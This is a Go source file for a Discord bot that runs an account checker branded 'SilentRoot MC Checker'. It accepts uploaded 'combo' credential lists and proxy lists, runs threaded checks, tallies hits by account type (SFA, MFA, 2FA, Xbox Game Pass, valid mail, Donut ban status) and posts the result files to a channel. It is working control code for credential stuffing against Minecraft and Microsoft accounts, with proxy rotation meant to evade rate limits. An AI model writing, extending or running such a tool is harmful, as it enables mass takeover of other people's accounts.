package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

// AuthorizedUsers stores user IDs allowed to run checker commands.
type AuthorizedUsers struct {
	mu    sync.RWMutex
	users map[string]bool
}

func newAuthorizedUsers() *AuthorizedUsers {
	return &AuthorizedUsers{users: make(map[string]bool)}
}

func (au *AuthorizedUsers) Add(id string) {
	au.mu.Lock()
	au.users[id] = true
	au.mu.Unlock()
}

func (au *AuthorizedUsers) Remove(id string) {
	au.mu.Lock()
	delete(au.users, id)
	au.mu.Unlock()
}

func (au *AuthorizedUsers) Has(id string) bool {
	au.mu.RLock()
	defer au.mu.RUnlock()
	return au.users[id]
}

// Bot is the main Discord bot struct.
type Bot struct {
	cfg       *Config
	session   *discordgo.Session
	authUsers *AuthorizedUsers
}

func NewBot(cfg *Config, s *discordgo.Session) *Bot {
	b := &Bot{
		cfg:       cfg,
		session:   s,
		authUsers: newAuthorizedUsers(),
	}
	// Owner is always authorized
	b.authUsers.Add(cfg.OwnerID)
	return b
}

func (b *Bot) isOwner(userID string) bool {
	return userID == b.cfg.OwnerID
}

func (b *Bot) isAuthorized(userID string) bool {
	return b.isOwner(userID) || b.authUsers.Has(userID)
}

// messageCreate is the main handler for incoming messages.
func (b *Bot) messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.Bot {
		return
	}
	prefix := b.cfg.Prefix
	content := strings.TrimSpace(m.Content)

	if !strings.HasPrefix(content, prefix) {
		return
	}

	parts := strings.Fields(content)
	cmd := strings.ToLower(parts[0])

	switch cmd {
	case prefix + "help":
		b.cmdHelp(s, m)
	case prefix + "auth":
		b.cmdAuth(s, m, parts)
	case prefix + "unauth":
		b.cmdUnauth(s, m, parts)
	case prefix + "cui":
		b.cmdCUI(s, m)
	case prefix + "check":
		b.cmdCheck(s, m)
	case prefix + "stop":
		b.cmdStop(s, m)
	case prefix + "uploadproxy":
		b.cmdUploadProxy(s, m)
	case prefix + "changeproxytype":
		b.cmdChangeProxyType(s, m, parts)
	}
}

// ── Command Handlers ──────────────────────────────────────────────────────────

func (b *Bot) cmdHelp(s *discordgo.Session, m *discordgo.MessageCreate) {
	embed := &discordgo.MessageEmbed{
		Title:       "🤖 Available Commands",
		Description: "Here is a list of all the commands you can use.",
		Color:       0x5865F2,
		Fields: []*discordgo.MessageEmbedField{
			{Name: "`" + b.cfg.Prefix + "help`", Value: "Shows this help message."},
			{Name: "`" + b.cfg.Prefix + "auth <user>`", Value: "Authorizes a user to run checker commands. (Owner only)"},
			{Name: "`" + b.cfg.Prefix + "unauth <user>`", Value: "Removes authorization from a user. (Owner only)"},
			{Name: "`" + b.cfg.Prefix + "cui`", Value: "Displays the live status of the checker."},
			{Name: "`" + b.cfg.Prefix + "check`", Value: "Starts the checker with an attached combo file."},
			{Name: "`" + b.cfg.Prefix + "stop`", Value: "Immediately stops the checker and sends results."},
			{Name: "`" + b.cfg.Prefix + "uploadproxy`", Value: "Upload a new SOCKS5 proxy file."},
			{Name: "`" + b.cfg.Prefix + "changeproxytype <type>`", Value: "Changes proxy type (1-5). 1:HTTP, 2:SOCKS4, 3:SOCKS5, 4:None, 5:Auto-Scrape."},
		},
		Footer: &discordgo.MessageEmbedFooter{Text: "SilentRoot MC Checker • Go Edition"},
	}
	_, _ = s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func (b *Bot) cmdAuth(s *discordgo.Session, m *discordgo.MessageCreate, parts []string) {
	if !b.isOwner(m.Author.ID) {
		sendError(s, m.ChannelID, "Only the owner can authorize users.")
		return
	}
	if len(parts) < 2 {
		sendError(s, m.ChannelID, "Usage: `"+b.cfg.Prefix+"auth <user_id>`")
		return
	}
	targetID := cleanMention(parts[1])
	b.authUsers.Add(targetID)
	sendSuccess(s, m.ChannelID, fmt.Sprintf("✅ User `%s` has been authorized.", targetID))
}

func (b *Bot) cmdUnauth(s *discordgo.Session, m *discordgo.MessageCreate, parts []string) {
	if !b.isOwner(m.Author.ID) {
		sendError(s, m.ChannelID, "Only the owner can remove authorization.")
		return
	}
	if len(parts) < 2 {
		sendError(s, m.ChannelID, "Usage: `"+b.cfg.Prefix+"unauth <user_id>`")
		return
	}
	targetID := cleanMention(parts[1])
	b.authUsers.Remove(targetID)
	sendSuccess(s, m.ChannelID, fmt.Sprintf("❌ Authorization removed from `%s`.", targetID))
}

func (b *Bot) cmdCUI(s *discordgo.Session, m *discordgo.MessageCreate) {
	if !b.isAuthorized(m.Author.ID) {
		sendError(s, m.ChannelID, "You are not authorized to use this command.")
		return
	}

	st := gStats.Snapshot()
	total := st.Total
	if total == 0 {
		total = 1 // avoid divide by zero in display
	}

	var elapsed string
	if checker.IsRunning() {
		elapsed = checker.Elapsed().Round(time.Second).String()
	} else {
		elapsed = "Not running"
	}

	// CPM calculation
	var cpm float64
	if checker.IsRunning() && checker.Elapsed().Seconds() > 1 {
		cpm = float64(st.Checked) / checker.Elapsed().Minutes()
	}

	statusTitle := "⏸️ Idle"
	statusColor := 0x808080
	if checker.IsRunning() {
		statusTitle = "▶️ Running"
		statusColor = 0x00FF7F
	} else if st.Total > 0 {
		statusTitle = "✅ Finished"
		statusColor = 0x00BFFF
	}

	embed := &discordgo.MessageEmbed{
		Title: "📊 Current Checker Status",
		Color: statusColor,
		Fields: []*discordgo.MessageEmbedField{
			{Name: "📋 Total/Checked", Value: fmt.Sprintf("%d/%d", st.Checked, st.Total), Inline: false},
			{Name: "✅ Hits", Value: fmt.Sprintf("%d", st.Hits), Inline: false},
			{Name: "❌ Bad", Value: fmt.Sprintf("%d", st.Bad), Inline: false},
			{Name: "🔒 SFA", Value: fmt.Sprintf("%d", st.SFA), Inline: false},
			{Name: "🔓 MFA", Value: fmt.Sprintf("%d", st.MFA), Inline: false},
			{Name: "📱 2FA", Value: fmt.Sprintf("%d", st.TwoFA), Inline: false},
			{Name: "🎮 Xbox Gamepass", Value: fmt.Sprintf("%d", st.XGP), Inline: false},
			{Name: "⭐ Xbox Gamepass Ultimate", Value: fmt.Sprintf("%d", st.XGPU), Inline: false},
			{Name: "🎲 Other", Value: fmt.Sprintf("%d", st.Other), Inline: false},
			{Name: "✉️ Valid Mail", Value: fmt.Sprintf("%d", st.ValidMail), Inline: false},
			{Name: "🔄 Retries", Value: fmt.Sprintf("%d", st.Retries), Inline: false},
			{Name: "⚠️ Errors", Value: fmt.Sprintf("%d", st.Errors), Inline: false},
			{Name: "🍩 Donut Banned", Value: fmt.Sprintf("%d", st.DonutBanned), Inline: false},
			{Name: "✅ Donut Clean", Value: fmt.Sprintf("%d", st.DonutUnbanned), Inline: false},
		},
		Footer: &discordgo.MessageEmbedFooter{
			Text: fmt.Sprintf("%s • CPM: %.0f • Elapsed: %s • Proxies: %d",
				statusTitle, cpm, elapsed, gProxies.Count()),
		},
	}
	_, _ = s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func (b *Bot) cmdCheck(s *discordgo.Session, m *discordgo.MessageCreate) {
	if !b.isAuthorized(m.Author.ID) {
		sendError(s, m.ChannelID, "You are not authorized to use this command.")
		return
	}
	if checker.IsRunning() {
		sendError(s, m.ChannelID, "A check is already running. Use `"+b.cfg.Prefix+"stop` first.")
		return
	}
	if len(m.Attachments) == 0 {
		sendError(s, m.ChannelID, "Please attach a combo file (.txt) to this command.")
		return
	}

	att := m.Attachments[0]
	if !strings.HasSuffix(strings.ToLower(att.Filename), ".txt") {
		sendError(s, m.ChannelID, "Combo file must be a .txt file.")
		return
	}

	// Download the attachment
	msgRef, _ := s.ChannelMessageSend(m.ChannelID, "⬇️ Downloading combo file...")
	raw, err := downloadAttachment(att.URL)
	if err != nil {
		editMessage(s, m.ChannelID, msgRef.ID, "❌ Failed to download combo file: "+err.Error())
		return
	}

	// Count combos
	lineCount := strings.Count(raw, "\n") + 1
	editMessage(s, m.ChannelID, msgRef.ID, fmt.Sprintf("📂 Loaded **%d** combos. Starting checker with **%d** threads...", lineCount, b.cfg.Threads))

	started := checker.StartCheck(b.cfg, raw, b.cfg.Threads)
	if !started {
		editMessage(s, m.ChannelID, msgRef.ID, "❌ Failed to start checker (no valid combos or already running).")
		return
	}

	// Watch for natural completion and send results automatically
	go func() {
		for checker.IsRunning() {
			time.Sleep(2 * time.Second)
		}
		// Only send if it finished on its own (not stopped via $stop)
		st := gStats.Snapshot()
		if st.Checked >= st.Total && st.Total > 0 {
			b.sendResultFiles(s, m.ChannelID)
		}
	}()

	embed := &discordgo.MessageEmbed{
		Title: "✅ Checker Started",
		Color: 0x00FF7F,
		Fields: []*discordgo.MessageEmbedField{
			{Name: "📂 File", Value: att.Filename, Inline: true},
			{Name: "📋 Combos", Value: fmt.Sprintf("%d", lineCount), Inline: true},
			{Name: "🔧 Threads", Value: fmt.Sprintf("%d", b.cfg.Threads), Inline: true},
			{Name: "🌐 Proxy Type", Value: proxyTypeName(gProxies.proxyType), Inline: true},
			{Name: "🌐 Proxies Loaded", Value: fmt.Sprintf("%d", gProxies.Count()), Inline: true},
		},
		Footer: &discordgo.MessageEmbedFooter{Text: "Use $cui to check status • $stop to stop"},
	}
	_ = s.ChannelMessageDelete(m.ChannelID, msgRef.ID)
	_, _ = s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func (b *Bot) cmdStop(s *discordgo.Session, m *discordgo.MessageCreate) {
	if !b.isAuthorized(m.Author.ID) {
		sendError(s, m.ChannelID, "You are not authorized to use this command.")
		return
	}
	if !checker.IsRunning() {
		sendError(s, m.ChannelID, "No checker is currently running.")
		return
	}

	msgRef, _ := s.ChannelMessageSend(m.ChannelID, "⏹️ Stopping checker...")
	elapsed := checker.Stop()
	st := gStats.Snapshot()

	embed := &discordgo.MessageEmbed{
		Title: "⏹️ Checker Stopped",
		Color: 0xFF4500,
		Fields: []*discordgo.MessageEmbedField{
			{Name: "📋 Total/Checked", Value: fmt.Sprintf("%d/%d", st.Checked, st.Total)},
			{Name: "✅ Hits", Value: fmt.Sprintf("%d", st.Hits), Inline: true},
			{Name: "❌ Bad", Value: fmt.Sprintf("%d", st.Bad), Inline: true},
			{Name: "🔒 SFA", Value: fmt.Sprintf("%d", st.SFA), Inline: true},
			{Name: "🔓 MFA", Value: fmt.Sprintf("%d", st.MFA), Inline: true},
			{Name: "📱 2FA", Value: fmt.Sprintf("%d", st.TwoFA), Inline: true},
			{Name: "🎮 Xbox Gamepass", Value: fmt.Sprintf("%d", st.XGP), Inline: true},
			{Name: "⭐ Xbox Gamepass Ultimate", Value: fmt.Sprintf("%d", st.XGPU), Inline: true},
			{Name: "🎲 Other", Value: fmt.Sprintf("%d", st.Other), Inline: true},
			{Name: "✉️ Valid Mail", Value: fmt.Sprintf("%d", st.ValidMail), Inline: true},
			{Name: "🍩 Donut Banned", Value: fmt.Sprintf("%d", st.DonutBanned), Inline: true},
			{Name: "✅ Donut Clean", Value: fmt.Sprintf("%d", st.DonutUnbanned), Inline: true},
			{Name: "🔄 Retries", Value: fmt.Sprintf("%d", st.Retries), Inline: true},
			{Name: "⚠️ Errors", Value: fmt.Sprintf("%d", st.Errors), Inline: true},
		},
		Footer: &discordgo.MessageEmbedFooter{
			Text: fmt.Sprintf("Results saved to: %s • Time: %s", ResultDir, elapsed.Round(time.Second)),
		},
	}
	_ = s.ChannelMessageDelete(m.ChannelID, msgRef.ID)
	_, _ = s.ChannelMessageSendEmbed(m.ChannelID, embed)

	// Send result files to results channel
	b.sendResultFiles(s, m.ChannelID)
}

func (b *Bot) cmdUploadProxy(s *discordgo.Session, m *discordgo.MessageCreate) {
	if !b.isAuthorized(m.Author.ID) {
		sendError(s, m.ChannelID, "You are not authorized to use this command.")
		return
	}
	if len(m.Attachments) == 0 {
		sendError(s, m.ChannelID, "Please attach a proxy file (.txt).")
		return
	}

	att := m.Attachments[0]
	raw, err := downloadAttachment(att.URL)
	if err != nil {
		sendError(s, m.ChannelID, "Failed to download proxy file: "+err.Error())
		return
	}

	lines := strings.Split(raw, "\n")
	gProxies.Load(lines)
	sendSuccess(s, m.ChannelID, fmt.Sprintf("✅ Loaded **%d** proxies from `%s`.", gProxies.Count(), att.Filename))
}

func (b *Bot) cmdChangeProxyType(s *discordgo.Session, m *discordgo.MessageCreate, parts []string) {
	if !b.isAuthorized(m.Author.ID) {
		sendError(s, m.ChannelID, "You are not authorized to use this command.")
		return
	}
	if len(parts) < 2 {
		sendError(s, m.ChannelID, "Usage: `"+b.cfg.Prefix+"changeproxytype <1-5>`\n1:HTTP, 2:SOCKS4, 3:SOCKS5, 4:None, 5:Auto-Scrape")
		return
	}
	t, err := strconv.Atoi(parts[1])
	if err != nil || t < 1 || t > 5 {
		sendError(s, m.ChannelID, "Invalid proxy type. Must be 1-5.")
		return
	}
	gProxies.SetType(t)

	if t == 5 {
		msg, _ := s.ChannelMessageSend(m.ChannelID, "🔄 Auto-scraping proxies, please wait...")
		go func() {
			gProxies.AutoScrape()
			editMessage(s, m.ChannelID, msg.ID, fmt.Sprintf("✅ Proxy type set to **Auto-Scrape**. Scraped **%d** proxies.", gProxies.Count()))
		}()
		return
	}

	sendSuccess(s, m.ChannelID, fmt.Sprintf("✅ Proxy type changed to **%s** (%d).", proxyTypeName(t), t))
}

// sendResultFiles uploads all non-empty result files to the results channel (or current channel as fallback).
func (b *Bot) sendResultFiles(s *discordgo.Session, fallbackChannelID string) {
	if ResultDir == "" {
		return
	}

	targetChannel := b.cfg.ResultsChannelID
	if targetChannel == "" {
		targetChannel = fallbackChannelID
	}

	// Collect non-empty result files
	files, err := collectResultFiles(ResultDir)
	if err != nil || len(files) == 0 {
		_, _ = s.ChannelMessageSend(targetChannel, "⚠️ No result files found.")
		return
	}

	_, _ = s.ChannelMessageSend(targetChannel, fmt.Sprintf("📁 **Results** — `%s` (%d files)", ResultDir, len(files)))

	// Discord allows max 10 files per message
	for i := 0; i < len(files); i += 10 {
		end := i + 10
		if end > len(files) {
			end = len(files)
		}
		chunk := files[i:end]
		var discordFiles []*discordgo.File
		for _, f := range chunk {
			discordFiles = append(discordFiles, f)
		}
		_, _ = s.ChannelMessageSendComplex(targetChannel, &discordgo.MessageSend{
			Files: discordFiles,
		})
		// Close readers after sending
		for _, f := range chunk {
			if rc, ok := f.Reader.(interface{ Close() error }); ok {
				rc.Close()
			}
		}
	}
}

func collectResultFiles(dir string) ([]*discordgo.File, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}
	var files []*discordgo.File
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		info, err := entry.Info()
		if err != nil || info.Size() == 0 {
			continue
		}
		path := dir + "/" + entry.Name()
		f, err := os.Open(path)
		if err != nil {
			continue
		}
		files = append(files, &discordgo.File{
			Name:   entry.Name(),
			Reader: f,
		})
	}
	return files, nil
}

func sendError(s *discordgo.Session, channelID, msg string) {
	_, _ = s.ChannelMessageSend(channelID, "❌ "+msg)
}

func sendSuccess(s *discordgo.Session, channelID, msg string) {
	_, _ = s.ChannelMessageSend(channelID, msg)
}

func editMessage(s *discordgo.Session, channelID, msgID, content string) {
	_, _ = s.ChannelMessageEdit(channelID, msgID, content)
}

func cleanMention(s string) string {
	s = strings.TrimPrefix(s, "<@")
	s = strings.TrimPrefix(s, "<@!")
	s = strings.TrimSuffix(s, ">")
	return s
}

func proxyTypeName(t int) string {
	switch t {
	case 1:
		return "HTTP"
	case 2:
		return "SOCKS4"
	case 3:
		return "SOCKS5"
	case 4:
		return "None (Proxyless)"
	case 5:
		return "Auto-Scrape"
	default:
		return "Unknown"
	}
}

func downloadAttachment(rawURL string) (string, error) {
	resp, err := http.Get(rawURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}
